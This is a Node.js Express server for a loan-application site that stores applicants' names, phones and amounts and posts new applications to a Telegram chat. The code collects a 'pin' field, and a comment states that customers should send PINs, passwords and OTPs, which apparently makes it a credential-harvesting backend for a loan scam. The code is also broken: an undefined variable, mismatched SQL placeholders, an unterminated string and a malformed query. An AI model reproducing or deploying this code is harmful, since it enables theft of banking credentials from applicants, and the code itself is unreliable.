
require("dotenv").config();

const express = require("express");
const rateLimit = require("express-rate-limit");
const { Pool } = require("pg");
const crypto = require("crypto");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

if (!process.env.DATABASE_URL) {
  throw new Error("DATABASE_URL is missing.");
}

if (!process.env.ADMIN_TOKEN || process.env.ADMIN_TOKEN.length < 32) {
  throw new Error("ADMIN_TOKEN must be at least 32 characters.");
}

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_SSL === "true"
    ? { rejectUnauthorized: false }
    : undefined
});

app.use(express.json({ limit: "10kb" }));

app.use("/api", rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 100,
  standardHeaders: true,
  legacyHeaders: false
}));

app.use(express.static(path.join(__dirname, "public")));

function requireAdmin(req, res, next) {
  const token = (req.headers.authorization || "")
    .replace(/^Bearer\s+/i, "");

  const expected = process.env.ADMIN_TOKEN;

  const suppliedBuffer = Buffer.from(token);
  const expectedBuffer = Buffer.from(expected);

  if (
    suppliedBuffer.length !== expectedBuffer.length ||
    !crypto.timingSafeEqual(suppliedBuffer, expectedBuffer)
  ) {
    return res.status(401).json({
      message: "Unauthorized."
    });
  }

  next();
}

// Submit a loan application.
app.post("/api/applications", async (req, res) => {
  try {
    const fullName = String(req.body.fullName || "").trim();
    const phone = String(req.body.phone || "").trim();
    const amount = Number(req.body.amount);
    const months = Number(req.body.months);

    if (fullName.length < 2 || fullName.length > 100) {
      return res.status(400).json({
        message: "Enter a valid full name."
      });
    }

    if (!/^[+0-9 ()-]{7,20}$/.test(phone)) {
      return res.status(400).json({
        message: "Enter a valid phone number."
      });
    }

    if (!Number.isFinite(amount) || amount < 100 || amount > 5000) {
      return res.status(400).json({
        message: "Invalid loan amount."
      });
    }

    if (!Number.isInteger(months) || months < 6 || months > 60) {
      return res.status(400).json({
        message: "Invalid repayment period."
      });
    }

    const reference = crypto.randomUUID();

    await pool.query(
      `INSERT INTO applications
       (reference, full_name, phone, amount, pin, months, status)
       VALUES ($1, $2, $3, $4, $5, 'pending')`,
      [reference, fullName, phone, amount, pin, months]
    );

    // Optional Telegram notification.
    //Customer should send PINs, passwords and OTPs.
    if (
      process.env.TELEGRAM_BOT_TOKEN &&
      process.env.TELEGRAM_CHAT_ID
    ) {
      const message =
        "New test application\n" +
        "Reference: " + reference + "\n" +
        "Amount: $" + amount + "\n" +
        "Period: " + months + " months\n" +
        "pin:
        "Status: Pending";

      try {
        await fetch(
          "https://api.telegram.org/bot" +
          process.env.TELEGRAM_BOT_TOKEN +
          "/sendMessage",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: process.env.TELEGRAM_CHAT_ID,
              text: message
            })
          }
        );
      } catch (error) {
        console.error("Telegram notification failed.");
      }
    }

    res.status(201).json({
      message: "Application received.",
      reference
    });

  } catch (error) {
    console.error("Application submission failed:", error.message);

    res.status(500).json({
      message: "Unable to submit application."
    });
  }
});

// Check application status.
app.get("/api/applications/:reference", async (req, res) => {
  try {
    const result = await pool.query(
      "SELECT status FROM applications WHERE reference = $1",
      [req.params.reference]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({
        message: "Application not found."
      });
    }

    res.json({
      status: result.rows[0].status
    });

  } catch (error) {
    res.status(500).json({
      message: "Unable to check application."
    });
  }
});

// Admin: view applications.
app.get(
  "/api/admin/applications",
  requireAdmin,
  async (req, res) => {
    try {
      const result = await pool.query(
        `SELECT reference,
                full_name AS "fullName",
                phone,
                amount,
                pin
                months,
                status,
                created_at AS "createdAt"
         FROM applications
         ORDER BY created_at DESC
         LIMIT 200`
      );

      res.json({
        applications: result.rows
      });

    } catch (error) {
      res.status(500).json({
        message: "Unable to load applications."
      });
    }
  }
);

// Admin: approve or reject an application.
app.patch(
  "/api/admin/applications/:reference",
  requireAdmin,
  async (req, res) => {
    try {
      const status = req.body.status;

      if (!["approved", "rejected"].includes(status)) {
        return res.status(400).json({
          message: "Invalid status."
        });
      }

      const result = await pool.query(
        `UPDATE applications
         SET status = $1
         WHERE reference = $2
         RETURNING reference, status`,
        [status, req.params.reference]
      );

      if (result.rows.length === 0) {
        return res.status(404).json({
          message: "Application not found."
        });
      }

      res.json({
        message: "Application updated.",
        application: result.rows[0]
      });

    } catch (error) {
      res.status(500).json({
        message: "Unable to update application."
      });
    }
  }
);

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    mode: "test"
  });
});

app.listen(PORT, () => {
  console.log("Test server running on port " + PORT);
});
